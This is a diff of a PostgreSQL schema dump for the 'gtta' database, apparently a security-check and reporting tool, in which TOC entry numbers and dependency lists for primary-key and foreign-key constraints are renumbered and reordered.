 -- Name: check_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1590,7 +2746,7 @@ ALTER TABLE ONLY check_categories
 
 
 --
--- TOC entry 2084 (class 2606 OID 21820)
+-- TOC entry 2081 (class 2606 OID 21820)
 -- Dependencies: 145 145 145
 -- Name: check_controls_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1600,7 +2756,7 @@ ALTER TABLE ONLY check_controls_l10n
 
 
 --
--- TOC entry 2082 (class 2606 OID 21822)
+-- TOC entry 2079 (class 2606 OID 21822)
 -- Dependencies: 143 143
 -- Name: check_controls_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1610,7 +2766,7 @@ ALTER TABLE ONLY check_controls
 
 
 --
--- TOC entry 2088 (class 2606 OID 21824)
+-- TOC entry 2085 (class 2606 OID 21824)
 -- Dependencies: 148 148 148
 -- Name: check_inputs_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1620,7 +2776,7 @@ ALTER TABLE ONLY check_inputs_l10n
 
 
 --
--- TOC entry 2086 (class 2606 OID 21826)
+-- TOC entry 2083 (class 2606 OID 21826)
 -- Dependencies: 146 146
 -- Name: check_inputs_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1630,7 +2786,7 @@ ALTER TABLE ONLY check_inputs
 
 
 --
--- TOC entry 2092 (class 2606 OID 21828)
+-- TOC entry 2089 (class 2606 OID 21828)
 -- Dependencies: 151 151 151
 -- Name: check_results_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1640,7 +2796,7 @@ ALTER TABLE ONLY check_results_l10n
 
 
 --
--- TOC entry 2090 (class 2606 OID 21830)
+-- TOC entry 2087 (class 2606 OID 21830)
 -- Dependencies: 149 149
 -- Name: check_results_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1650,7 +2806,7 @@ ALTER TABLE ONLY check_results
 
 
 --
--- TOC entry 2096 (class 2606 OID 21832)
+-- TOC entry 2093 (class 2606 OID 21832)
 -- Dependencies: 154 154 154
 -- Name: check_solutions_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1660,7 +2816,7 @@ ALTER TABLE ONLY check_solutions_l10n
 
 
 --
--- TOC entry 2094 (class 2606 OID 21834)
+-- TOC entry 2091 (class 2606 OID 21834)
 -- Dependencies: 152 152
 -- Name: check_solutions_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1670,7 +2826,7 @@ ALTER TABLE ONLY check_solutions
 
 
 --
--- TOC entry 2100 (class 2606 OID 21836)
+-- TOC entry 2097 (class 2606 OID 21836)
 -- Dependencies: 157 157 157
 -- Name: checks_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1680,7 +2836,7 @@ ALTER TABLE ONLY checks_l10n
 
 
 --
--- TOC entry 2098 (class 2606 OID 21838)
+-- TOC entry 2095 (class 2606 OID 21838)
 -- Dependencies: 155 155
 -- Name: checks_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1690,7 +2846,7 @@ ALTER TABLE ONLY checks
 
 
 --
--- TOC entry 2102 (class 2606 OID 21840)
+-- TOC entry 2099 (class 2606 OID 21840)
 -- Dependencies: 158 158
 -- Name: clients_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1700,7 +2856,7 @@ ALTER TABLE ONLY clients
 
 
 --
--- TOC entry 2104 (class 2606 OID 21842)
+-- TOC entry 2101 (class 2606 OID 21842)
 -- Dependencies: 160 160
 -- Name: emails_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1710,7 +2866,7 @@ ALTER TABLE ONLY emails
 
 
 --
--- TOC entry 2106 (class 2606 OID 21844)
+-- TOC entry 2103 (class 2606 OID 21844)
 -- Dependencies: 162 162
 -- Name: languages_code_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1720,7 +2876,7 @@ ALTER TABLE ONLY languages
 
 
 --
--- TOC entry 2108 (class 2606 OID 21846)
+-- TOC entry 2105 (class 2606 OID 21846)
 -- Dependencies: 162 162
 -- Name: languages_name_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1730,7 +2886,7 @@ ALTER TABLE ONLY languages
 
 
 --
--- TOC entry 2110 (class 2606 OID 21848)
+-- TOC entry 2107 (class 2606 OID 21848)
 -- Dependencies: 162 162
 -- Name: languages_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1740,7 +2896,7 @@ ALTER TABLE ONLY languages
 
 
 --
--- TOC entry 2168 (class 2606 OID 28222)
+-- TOC entry 2165 (class 2606 OID 28222)
 -- Dependencies: 202 202
 -- Name: login_history_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1750,7 +2906,7 @@ ALTER TABLE ONLY login_history
 
 
 --
--- TOC entry 2112 (class 2606 OID 21850)
+-- TOC entry 2109 (class 2606 OID 21850)
 -- Dependencies: 164 164
 -- Name: project_details_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1760,7 +2916,7 @@ ALTER TABLE ONLY project_details
 
 
 --
--- TOC entry 2146 (class 2606 OID 26348)
+-- TOC entry 2143 (class 2606 OID 26348)
 -- Dependencies: 187 187 187
 -- Name: project_users_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1770,7 +2926,7 @@ ALTER TABLE ONLY project_users
 
 
 --
--- TOC entry 2114 (class 2606 OID 21852)
+-- TOC entry 2111 (class 2606 OID 21852)
 -- Dependencies: 166 166
 -- Name: projects_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1780,7 +2936,7 @@ ALTER TABLE ONLY projects
 
 
 --
--- TOC entry 2116 (class 2606 OID 21854)
+-- TOC entry 2113 (class 2606 OID 21854)
 -- Dependencies: 168 168
 -- Name: references_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1790,7 +2946,7 @@ ALTER TABLE ONLY "references"
 
 
 --
--- TOC entry 2166 (class 2606 OID 28082)
+-- TOC entry 2163 (class 2606 OID 28082)
 -- Dependencies: 200 200 200
 -- Name: report_template_sections_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1800,7 +2956,7 @@ ALTER TABLE ONLY report_template_sections_l10n
 
 
 --
--- TOC entry 2162 (class 2606 OID 28064)
+-- TOC entry 2159 (class 2606 OID 28064)
 -- Dependencies: 199 199
 -- Name: report_template_sections_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1810,7 +2966,7 @@ ALTER TABLE ONLY report_template_sections
 
 
 --
--- TOC entry 2164 (class 2606 OID 28164)
+-- TOC entry 2161 (class 2606 OID 28164)
 -- Dependencies: 199 199 199
 -- Name: report_template_sections_report_template_id_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1820,7 +2976,7 @@ ALTER TABLE ONLY report_template_sections
 
 
 --
--- TOC entry 2160 (class 2606 OID 27354)
+-- TOC entry 2157 (class 2606 OID 27354)
 -- Dependencies: 197 197 197
 -- Name: report_template_summary_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1830,7 +2986,7 @@ ALTER TABLE ONLY report_template_summary_l10n
 
 
 --
--- TOC entry 2158 (class 2606 OID 27346)
+-- TOC entry 2155 (class 2606 OID 27346)
 -- Dependencies: 196 196
 -- Name: report_template_summary_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1840,7 +2996,7 @@ ALTER TABLE ONLY report_template_summary
 
 
 --
--- TOC entry 2156 (class 2606 OID 27322)
+-- TOC entry 2153 (class 2606 OID 27322)
 -- Dependencies: 194 194 194
 -- Name: report_templates_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1850,7 +3006,7 @@ ALTER TABLE ONLY report_templates_l10n
 
 
 --
--- TOC entry 2154 (class 2606 OID 27314)
+-- TOC entry 2151 (class 2606 OID 27314)
 -- Dependencies: 193 193
 -- Name: report_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1860,7 +3016,7 @@ ALTER TABLE ONLY report_templates
 
 
 --
--- TOC entry 2140 (class 2606 OID 22089)
+-- TOC entry 2137 (class 2606 OID 22089)
 -- Dependencies: 184 184 184
 -- Name: risk_categories_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1870,7 +3026,7 @@ ALTER TABLE ONLY risk_categories_l10n
 
 
 --
--- TOC entry 2138 (class 2606 OID 22081)
+-- TOC entry 2135 (class 2606 OID 22081)
 -- Dependencies: 183 183
 -- Name: risk_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1880,7 +3036,7 @@ ALTER TABLE ONLY risk_categories
 
 
 --
--- TOC entry 2142 (class 2606 OID 24903)
+-- TOC entry 2139 (class 2606 OID 24903)
 -- Dependencies: 185 185 185
 -- Name: risk_category_checks_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1890,7 +3046,7 @@ ALTER TABLE ONLY risk_category_checks
 
 
 --
--- TOC entry 2150 (class 2606 OID 26377)
+-- TOC entry 2147 (class 2606 OID 26377)
 -- Dependencies: 190 190 190
 -- Name: risk_templates_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1900,7 +3056,7 @@ ALTER TABLE ONLY risk_templates_l10n
 
 
 --
--- TOC entry 2148 (class 2606 OID 26369)
+-- TOC entry 2145 (class 2606 OID 26369)
 -- Dependencies: 189 189
 -- Name: risk_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1910,7 +3066,7 @@ ALTER TABLE ONLY risk_templates
 
 
 --
--- TOC entry 2144 (class 2606 OID 26343)
+-- TOC entry 2141 (class 2606 OID 26343)
 -- Dependencies: 186 186
 -- Name: sessions_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1920,7 +3076,7 @@ ALTER TABLE ONLY sessions
 
 
 --
--- TOC entry 2118 (class 2606 OID 21856)
+-- TOC entry 2115 (class 2606 OID 21856)
 -- Dependencies: 170 170
 -- Name: system_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1930,7 +3086,7 @@ ALTER TABLE ONLY system
 
 
 --
--- TOC entry 2120 (class 2606 OID 21858)
+-- TOC entry 2117 (class 2606 OID 21858)
 -- Dependencies: 172 172
 -- Name: target_check_attachments_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1940,7 +3096,7 @@ ALTER TABLE ONLY target_check_attachments
 
 
 --
--- TOC entry 2122 (class 2606 OID 21860)
+-- TOC entry 2119 (class 2606 OID 21860)
 -- Dependencies: 173 173 173
 -- Name: target_check_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1950,7 +3106,7 @@ ALTER TABLE ONLY target_check_categories
 
 
 --
--- TOC entry 2124 (class 2606 OID 21862)
+-- TOC entry 2121 (class 2606 OID 21862)
 -- Dependencies: 174 174 174
 -- Name: target_check_inputs_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1960,7 +3116,7 @@ ALTER TABLE ONLY target_check_inputs
 
 
 --
--- TOC entry 2126 (class 2606 OID 21864)
+-- TOC entry 2123 (class 2606 OID 21864)
 -- Dependencies: 175 175 175
 -- Name: target_check_solutions_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1970,7 +3126,7 @@ ALTER TABLE ONLY target_check_solutions
 
 
 --
--- TOC entry 2152 (class 2606 OID 26910)
+-- TOC entry 2149 (class 2606 OID 26910)
 -- Dependencies: 191 191 191
 -- Name: target_check_vulns_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1980,7 +3136,7 @@ ALTER TABLE ONLY target_check_vulns
 
 
 --
--- TOC entry 2128 (class 2606 OID 21866)
+-- TOC entry 2125 (class 2606 OID 21866)
 -- Dependencies: 176 176 176
 -- Name: target_checks_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1990,7 +3146,7 @@ ALTER TABLE ONLY target_checks
 
 
 --
--- TOC entry 2130 (class 2606 OID 21868)
+-- TOC entry 2127 (class 2606 OID 21868)
 -- Dependencies: 177 177 177
 -- Name: target_references_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -2000,7 +3156,7 @@ ALTER TABLE ONLY target_references
 
 
 --
--- TOC entry 2132 (class 2606 OID 21870)
+-- TOC entry 2129 (class 2606 OID 21870)
 -- Dependencies: 178 178
 -- Name: targets_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -2010,7 +3166,7 @@ ALTER TABLE ONLY targets
 
 
 --
--- TOC entry 2134 (class 2606 OID 21872)
+-- TOC entry 2131 (class 2606 OID 21872)
 -- Dependencies: 180 180
 -- Name: users_email_key; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -2020,7 +3176,7 @@ ALTER TABLE ONLY users
 
 
 --
--- TOC entry 2136 (class 2606 OID 21874)
+-- TOC entry 2133 (class 2606 OID 21874)
 -- Dependencies: 180 180
 -- Name: users_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -2030,8 +3186,8 @@ ALTER TABLE ONLY users
 
 
 --
--- TOC entry 2169 (class 2606 OID 21875)
--- Dependencies: 2077 140 142
+-- TOC entry 2166 (class 2606 OID 21875)
+-- Dependencies: 142 140 2074
 -- Name: check_categories_l10n_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2040,8 +3196,8 @@ ALTER TABLE ONLY check_categories_l10n
 
 
 --
--- TOC entry 2170 (class 2606 OID 21880)
--- Dependencies: 2109 142 162
+-- TOC entry 2167 (class 2606 OID 21880)
+-- Dependencies: 2106 162 142
 -- Name: check_categories_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2050,8 +3206,8 @@ ALTER TABLE ONLY check_categories_l10n
 
 
 --
--- TOC entry 2171 (class 2606 OID 28304)
--- Dependencies: 143 2077 140
+-- TOC entry 2168 (class 2606 OID 28304)
+-- Dependencies: 2074 143 140
 -- Name: check_controls_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2060,8 +3216,8 @@ ALTER TABLE ONLY check_controls
 
 
 --
--- TOC entry 2172 (class 2606 OID 21890)
--- Dependencies: 2081 145 143
+-- TOC entry 2169 (class 2606 OID 21890)
+-- Dependencies: 145 143 2078
 -- Name: check_controls_l10n_check_control_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2070,8 +3226,8 @@ ALTER TABLE ONLY check_controls_l10n
 
 
 --
--- TOC entry 2173 (class 2606 OID 21895)
--- Dependencies: 2109 145 162
+-- TOC entry 2170 (class 2606 OID 21895)
+-- Dependencies: 145 2106 162
 -- Name: check_controls_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2080,8 +3236,8 @@ ALTER TABLE ONLY check_controls_l10n
 
 
 --
--- TOC entry 2174 (class 2606 OID 29326)
--- Dependencies: 2097 155 146
+-- TOC entry 2171 (class 2606 OID 29326)
+-- Dependencies: 2094 146 155
 -- Name: check_inputs_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2090,8 +3246,8 @@ ALTER TABLE ONLY check_inputs
 
 
 --
--- TOC entry 2175 (class 2606 OID 21905)
--- Dependencies: 2085 146 148
+-- TOC entry 2172 (class 2606 OID 21905)
+-- Dependencies: 2082 148 146
 -- Name: check_inputs_l10n_check_input_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2100,8 +3256,8 @@ ALTER TABLE ONLY check_inputs_l10n
 
 
 --
--- TOC entry 2176 (class 2606 OID 21910)
--- Dependencies: 162 148 2109
+-- TOC entry 2173 (class 2606 OID 21910)
+-- Dependencies: 148 2106 162
 -- Name: check_inputs_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2110,8 +3266,8 @@ ALTER TABLE ONLY check_inputs_l10n
 
 
 --
--- TOC entry 2177 (class 2606 OID 22135)
--- Dependencies: 2097 155 149
+-- TOC entry 2174 (class 2606 OID 22135)
+-- Dependencies: 155 2094 149
 -- Name: check_results_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2120,8 +3276,8 @@ ALTER TABLE ONLY check_results
 
 
 --
--- TOC entry 2178 (class 2606 OID 22105)
--- Dependencies: 2089 151 149
+-- TOC entry 2175 (class 2606 OID 22105)
+-- Dependencies: 149 2086 151
 -- Name: check_results_l10n_check_result_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2130,8 +3286,8 @@ ALTER TABLE ONLY check_results_l10n
 
 
 --
--- TOC entry 2179 (class 2606 OID 22110)
--- Dependencies: 2109 151 162
+-- TOC entry 2176 (class 2606 OID 22110)
+-- Dependencies: 162 151 2106
 -- Name: check_results_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2140,8 +3296,8 @@ ALTER TABLE ONLY check_results_l10n
 
 
 --
--- TOC entry 2180 (class 2606 OID 22130)
--- Dependencies: 2097 155 152
+-- TOC entry 2177 (class 2606 OID 22130)
+-- Dependencies: 152 155 2094
 -- Name: check_solutions_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2150,8 +3306,8 @@ ALTER TABLE ONLY check_solutions
 
 
 --
--- TOC entry 2181 (class 2606 OID 22120)
--- Dependencies: 152 2093 154
+-- TOC entry 2178 (class 2606 OID 22120)
+-- Dependencies: 2090 154 152
 -- Name: check_solutions_l10n_check_solution_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2160,8 +3316,8 @@ ALTER TABLE ONLY check_solutions_l10n
 
 
 --
--- TOC entry 2182 (class 2606 OID 22125)
--- Dependencies: 2109 154 162
+-- TOC entry 2179 (class 2606 OID 22125)
+-- Dependencies: 154 162 2106
 -- Name: check_solutions_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2170,8 +3326,8 @@ ALTER TABLE ONLY check_solutions_l10n
 
 
 --
--- TOC entry 2183 (class 2606 OID 28318)
--- Dependencies: 2081 155 143
+-- TOC entry 2180 (class 2606 OID 28318)
+-- Dependencies: 143 155 2078
 -- Name: checks_check_control_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2180,8 +3336,8 @@ ALTER TABLE ONLY checks
 
 
 --
--- TOC entry 2185 (class 2606 OID 22150)
--- Dependencies: 157 2097 155
+-- TOC entry 2182 (class 2606 OID 22150)
+-- Dependencies: 155 2094 157
 -- Name: checks_l10n_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2190,8 +3346,8 @@ ALTER TABLE ONLY checks_l10n
 
 
 --
--- TOC entry 2186 (class 2606 OID 22155)
--- Dependencies: 157 162 2109
+-- TOC entry 2183 (class 2606 OID 22155)
+-- Dependencies: 2106 162 157
 -- Name: checks_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2200,8 +3356,8 @@ ALTER TABLE ONLY checks_l10n
 
 
 --
--- TOC entry 2184 (class 2606 OID 28323)
--- Dependencies: 168 2115 155
+-- TOC entry 2181 (class 2606 OID 28323)
+-- Dependencies: 155 168 2112
 -- Name: checks_reference_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2210,8 +3366,8 @@ ALTER TABLE ONLY checks
 
 
 --
--- TOC entry 2187 (class 2606 OID 21965)
--- Dependencies: 160 180 2135
+-- TOC entry 2184 (class 2606 OID 21965)
+-- Dependencies: 2132 180 160
 -- Name: emails_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2220,8 +3376,8 @@ ALTER TABLE ONLY emails
 
 
 --
--- TOC entry 2233 (class 2606 OID 28242)
--- Dependencies: 2135 202 180
+-- TOC entry 2230 (class 2606 OID 28242)
+-- Dependencies: 180 202 2132
 -- Name: login_history_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2230,8 +3386,8 @@ ALTER TABLE ONLY login_history
 
 
 --
--- TOC entry 2188 (class 2606 OID 21970)
--- Dependencies: 2113 166 164
+-- TOC entry 2185 (class 2606 OID 21970)
+-- Dependencies: 2110 166 164
 -- Name: project_details_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2240,8 +3396,8 @@ ALTER TABLE ONLY project_details
 
 
 --
--- TOC entry 2216 (class 2606 OID 26896)
--- Dependencies: 166 187 2113
+-- TOC entry 2213 (class 2606 OID 26896)
+-- Dependencies: 187 2110 166
 -- Name: project_users_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2250,8 +3406,8 @@ ALTER TABLE ONLY project_users
 
 
 --
--- TOC entry 2217 (class 2606 OID 26901)
--- Dependencies: 180 2135 187
+-- TOC entry 2214 (class 2606 OID 26901)
+-- Dependencies: 180 2132 187
 -- Name: project_users_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2260,8 +3416,8 @@ ALTER TABLE ONLY project_users
 
 
 --
--- TOC entry 2189 (class 2606 OID 26965)
--- Dependencies: 2101 158 166
+-- TOC entry 2186 (class 2606 OID 26965)
+-- Dependencies: 158 166 2098
 -- Name: projects_client_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2270,8 +3426,8 @@ ALTER TABLE ONLY projects
 
 
 --
--- TOC entry 2229 (class 2606 OID 28153)
--- Dependencies: 199 2077 140
+-- TOC entry 2226 (class 2606 OID 28153)
+-- Dependencies: 140 2074 199
 -- Name: report_template_sections_check_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2280,8 +3436,8 @@ ALTER TABLE ONLY report_template_sections
 
 
 --
--- TOC entry 2231 (class 2606 OID 28143)
--- Dependencies: 2109 162 200
+-- TOC entry 2228 (class 2606 OID 28143)
+-- Dependencies: 200 2106 162
 -- Name: report_template_sections_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2290,8 +3446,8 @@ ALTER TABLE ONLY report_template_sections_l10n
 
 
 --
--- TOC entry 2232 (class 2606 OID 28148)
--- Dependencies: 2161 199 200
+-- TOC entry 2229 (class 2606 OID 28148)
+-- Dependencies: 200 2158 199
 -- Name: report_template_sections_l10n_report_template_section_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2300,8 +3456,8 @@ ALTER TABLE ONLY report_template_sections_l10n
 
 
 --
--- TOC entry 2230 (class 2606 OID 28158)
--- Dependencies: 199 2153 193
+-- TOC entry 2227 (class 2606 OID 28158)
+-- Dependencies: 2150 193 199
 -- Name: report_template_sections_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2310,8 +3466,8 @@ ALTER TABLE ONLY report_template_sections
 
 
 --
--- TOC entry 2227 (class 2606 OID 27375)
--- Dependencies: 2109 162 197
+-- TOC entry 2224 (class 2606 OID 27375)
+-- Dependencies: 2106 197 162
 -- Name: report_template_summary_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2320,8 +3476,8 @@ ALTER TABLE ONLY report_template_summary_l10n
 
 
 --
--- TOC entry 2228 (class 2606 OID 27380)
--- Dependencies: 197 2157 196
+-- TOC entry 2225 (class 2606 OID 27380)
+-- Dependencies: 2154 197 196
 -- Name: report_template_summary_l10n_report_template_summary_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2330,8 +3486,8 @@ ALTER TABLE ONLY report_template_summary_l10n
 
 
 --
--- TOC entry 2226 (class 2606 OID 28118)
--- Dependencies: 193 2153 196
+-- TOC entry 2223 (class 2606 OID 28118)
+-- Dependencies: 2150 196 193
 -- Name: report_template_summary_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2340,8 +3496,8 @@ ALTER TABLE ONLY report_template_summary
 
 
 --
--- TOC entry 2224 (class 2606 OID 28175)
--- Dependencies: 2109 162 194
+-- TOC entry 2221 (class 2606 OID 28175)
+-- Dependencies: 162 194 2106
 -- Name: report_templates_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2350,8 +3506,8 @@ ALTER TABLE ONLY report_templates_l10n
 
 
 --
--- TOC entry 2225 (class 2606 OID 28180)
--- Dependencies: 2153 194 193
+-- TOC entry 2222 (class 2606 OID 28180)
+-- Dependencies: 2150 193 194
 -- Name: report_templates_l10n_report_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2360,8 +3516,8 @@ ALTER TABLE ONLY report_templates_l10n
 
 
 --
--- TOC entry 2213 (class 2606 OID 22095)
--- Dependencies: 162 184 2109
+-- TOC entry 2210 (class 2606 OID 22095)
+-- Dependencies: 2106 184 162
 -- Name: risk_categories_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2370,8 +3526,8 @@ ALTER TABLE ONLY risk_categories_l10n
 
 
 --
--- TOC entry 2212 (class 2606 OID 22090)
--- Dependencies: 183 184 2137
+-- TOC entry 2209 (class 2606 OID 22090)
+-- Dependencies: 184 183 2134
 -- Name: risk_categories_l10n_risk_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2380,8 +3536,8 @@ ALTER TABLE ONLY risk_categories_l10n
 
 
 --
--- TOC entry 2211 (class 2606 OID 26388)
--- Dependencies: 189 183 2147
+-- TOC entry 2208 (class 2606 OID 26388)
+-- Dependencies: 189 183 2144
 -- Name: risk_categories_risk_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2390,8 +3546,8 @@ ALTER TABLE ONLY risk_categories
 
 
 --
--- TOC entry 2214 (class 2606 OID 24924)
--- Dependencies: 185 2097 155
+-- TOC entry 2211 (class 2606 OID 24924)
+-- Dependencies: 155 2094 185
 -- Name: risk_category_checks_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2400,8 +3556,8 @@ ALTER TABLE ONLY risk_category_checks
 
 
 --
--- TOC entry 2215 (class 2606 OID 24929)
--- Dependencies: 2137 185 183
+-- TOC entry 2212 (class 2606 OID 24929)
+-- Dependencies: 185 183 2134
 -- Name: risk_category_checks_risk_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2410,8 +3566,8 @@ ALTER TABLE ONLY risk_category_checks
 
 
 --
--- TOC entry 2219 (class 2606 OID 26383)
--- Dependencies: 189 190 2147
+-- TOC entry 2216 (class 2606 OID 26383)
+-- Dependencies: 2144 190 189
 -- Name: risk_templates_l10n_risk_template_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2420,8 +3576,8 @@ ALTER TABLE ONLY risk_templates_l10n
 
 
 --
--- TOC entry 2218 (class 2606 OID 26378)
--- Dependencies: 162 190 2109
+-- TOC entry 2215 (class 2606 OID 26378)
+-- Dependencies: 162 190 2106
 -- Name: risk_templatess_l10n_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2430,8 +3586,8 @@ ALTER TABLE ONLY risk_templates_l10n
 
 
 --
--- TOC entry 2190 (class 2606 OID 27274)
--- Dependencies: 155 172 2097
+-- TOC entry 2187 (class 2606 OID 27274)
+-- Dependencies: 155 2094 172
 -- Name: target_check_attachments_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2440,8 +3596,8 @@ ALTER TABLE ONLY target_check_attachments
 
 
 --
--- TOC entry 2191 (class 2606 OID 27279)
--- Dependencies: 172 2131 178
+-- TOC entry 2188 (class 2606 OID 27279)
+-- Dependencies: 172 2128 178
 -- Name: target_check_attachments_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2450,8 +3606,8 @@ ALTER TABLE ONLY target_check_attachments
 
 
 --
--- TOC entry 2192 (class 2606 OID 27284)
--- Dependencies: 176 172 172 2127 176
+-- TOC entry 2189 (class 2606 OID 27284)
+-- Dependencies: 176 2124 172 172 176
 -- Name: target_check_attachments_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -2460,8 +3616,8 @@ ALTER TABLE ONLY target_check_attachments
 
 
 --
--- TOC entry 2193 (class 2606 OID 27294)
